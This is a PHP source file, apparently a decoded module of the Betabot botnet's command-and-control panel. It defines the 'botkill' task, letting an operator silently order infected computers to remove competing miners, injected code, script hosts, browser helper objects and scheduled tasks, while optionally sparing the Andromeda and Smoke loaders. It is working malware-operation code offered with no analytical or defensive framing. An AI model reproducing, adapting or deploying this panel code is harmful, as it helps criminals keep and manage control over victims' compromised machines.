<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!defined("IN_TASKS_MODULE")) {
    exit("..");
}
$ppt_task_option_btc = "";
$ppt_task_option_inject = "checked";
$ppt_task_option_scripts = "checked";
$ppt_task_option_bhos = "";
$ppt_task_option_ignore_if_parent = "checked";
$ppt_task_option_ignore_loaders = "";
$ppt_task_option_kill_tasks = "";
if (!isset($_TASK_FILE_UI_ONLY)) {
    $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT;
    $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_BOTKILL;
    if (isset($_POST["cmd_botkill_btc"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_MINERS;
        $ppt_task_option_btc = "checked";
    } else {
        $ppt_task_option_btc = "";
    }
    if (isset($_POST["cmd_botkill_inject"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_INJECT;
        $ppt_task_option_inject = "checked";
    } else {
        $ppt_task_option_inject = "";
    }
    if (isset($_POST["cmd_botkill_scripts"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_SCRIPTS;
        $ppt_task_option_scripts = "checked";
    } else {
        $ppt_task_option_scripts = "";
    }
    if (isset($_POST["cmd_botkill_bhos"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_BHOS;
        $ppt_task_option_bhos = "checked";
    } else {
        $ppt_task_option_bhos = "";
    }
    if (isset($_POST["cmd_botkill_ignore_if_parent"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_IGNORE_IF_PARENT;
        $ppt_task_option_ignore_if_parent = "checked";
    } else {
        $ppt_task_option_ignore_if_parent = "";
    }
    if (isset($_POST["cmd_botkill_ignore_loaders"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_IGNORE_LOADERS;
        $ppt_task_option_ignore_loaders = "checked";
    } else {
        $ppt_task_option_ignore_loaders = "";
    }
    if (isset($_POST["cmd_botkill_kill_tasks"])) {
        $e_cmd_switches .= COMMAND_BOTKILL_SWITCH_KILL_TASKS;
        $ppt_task_option_kill_tasks = "checked";
    } else {
        $ppt_task_option_kill_tasks = "";
    }
    $_TASK_COMMAND_STRING = sprintf(COMMAND_FORMAT_BOTKILL, COMMAND_STRING_BOTKILL, $e_cmd_switches);
} else {
    if (0 < strlen($e_task_cmd_string)) {
        $task_bk_splits = @explode(" ", $e_task_cmd_string);
        $task_bk_edit__switches = $task_bk_splits[1];
        if ($task_bk_edit__switches) {
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_MINERS)) {
                $ppt_task_option_btc = "checked";
            } else {
                $ppt_task_option_btc = "";
            }
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_INJECT)) {
                $ppt_task_option_inject = "checked";
            } else {
                $ppt_task_option_inject = "";
            }
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_SCRIPTS)) {
                $ppt_task_option_scripts = "checked";
            } else {
                $ppt_task_option_scripts = "";
            }
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_BHOS)) {
                $ppt_task_option_bhos = "checked";
            } else {
                $ppt_task_option_bhos = "";
            }
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_IGNORE_IF_PARENT)) {
                $ppt_task_option_ignore_if_parent = "checked";
            } else {
                $ppt_task_option_ignore_if_parent = "";
            }
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_IGNORE_LOADERS)) {
                $ppt_task_option_ignore_loaders = "checked";
            } else {
                $ppt_task_option_ignore_loaders = "";
            }
            if (strstr($task_bk_edit__switches, COMMAND_BOTKILL_SWITCH_KILL_TASKS)) {
                $ppt_task_option_kill_tasks = "checked";
            } else {
                $ppt_task_option_kill_tasks = "";
            }
        }
    }
    echo "\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Botkill Command options", 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
    echo "\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"botkill\">\n\t\t\t\t<br />\n\t\t\t    <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 230px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_btc\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_btc;
    echo ">\n                Remove detected BTC/LTC miners\n                </label>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 290px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_inject\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_inject;
    echo ">\n                Remove/terminate injected code and zombified processes\n                </label>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 290px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_scripts\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_scripts;
    echo ">\n                Terminate VBScript/other script hosting processes\n                </label>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 290px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_bhos\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_bhos;
    echo ">\n                Disable unsigned browser helper objects for IE\n                </label>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 680px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_ignore_if_parent\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_ignore_if_parent;
    echo ">\n                Ignore processes created by betabot process <i>(Botkill will not analyze/terminate any process that is a direct child process of this bot instance)</i>\n                </label>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 880px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_ignore_loaders\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_ignore_loaders;
    echo ">\n                Try to ignore common/popular loaders <i>(Botkill will try not to remove Andromeda/Smoke loader -- However due to the way some of their autostart options work, it may not be possible)</i>\n                </label>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 880px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_botkill_kill_tasks\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_kill_tasks;
    echo ">\n                Scan task scheduler entries <i>(Some bots use task scheduler to run with elevated privileges on reboot)</i>\n                </label>\n\t\t\t\t";
}

?>